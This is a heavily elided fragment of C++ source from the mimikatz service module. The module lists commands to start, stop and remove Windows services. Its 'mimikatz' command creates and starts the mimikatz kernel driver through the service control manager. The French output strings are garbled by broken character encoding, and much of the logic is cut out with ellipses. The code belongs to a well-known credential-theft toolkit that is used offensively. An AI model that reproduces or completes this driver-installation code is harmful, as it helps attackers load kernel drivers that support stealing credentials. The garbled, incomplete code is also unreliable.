...
vector<KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND> mod_mimikatz_service::getMimiKatzCommands()
{
	...
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(start,		L"start",		L"D閙arre un service ou pilote"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(stop,		L"stop",		L"Arr阾e un service ou pilote"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(remove,		L"remove",		L"Supprime un service ou pilote"));
	monVector.push_back(KIWI_MIMIKATZ_LOCAL_MODULE_COMMAND(mimikatz,	L"mimikatz",	L"Installe et/ou d閙arre le pilote mimikatz"));
	return monVector;
}

bool mod_mimikatz_service::start(vector<wstring> * arguments)
{
	(*outputStream) << L"D閙arrage de \'";
	return genericFunction(mod_service::start, arguments);
}

bool mod_mimikatz_service::stop(vector<wstring> * arguments)
{
	(*outputStream) << L"Arr阾 de \'";
...
bool mod_mimikatz_service::mimikatz(vector<wstring> * arguments)
{
	if(SC_HANDLE monManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))
	{
		...
		if(!(monService = OpenService(monManager, L"mimikatz", SERVICE_START)))
		{
			...
			{
				(*outputStream) << L"[*] Pilote mimikatz non pr閟ent, installation." << endl;
				...
				if(mod_system::getAbsolutePathOf(monPilote, &monPiloteComplet))
				{
					...
					if(mod_system::isFileExist(monPiloteComplet, &fileExist) && fileExist)
					{
						...
						{
							(*outputStream) << L"[+] Cr閍tion du pilote : OK" << endl;
						...
						else (*outputStream) << L"[!] Impossible de cr閑r le pilote ; " << mod_system::getWinError() << endl;
					}
		...
		else (*outputStream) << L"[*] Pilote mimikatz d閖?pr閟ent" << endl;
		
		if(monService)
		{
			if(StartService(monService, 0, NULL) != 0)
				(*outputStream) << L"[+] D閙arrage du pilote : OK";
			else
				(*outputStream) << L"[-] D閙arrage du pilote : KO ; " << mod_system::getWinError();
			(*outputStream) << endl;
	...
	else (*outputStream) << L"[!] Impossible d\'ouvrir le gestionnaire de service pour cr閍tion ; " << mod_system::getWinError() << endl;
	return true;
}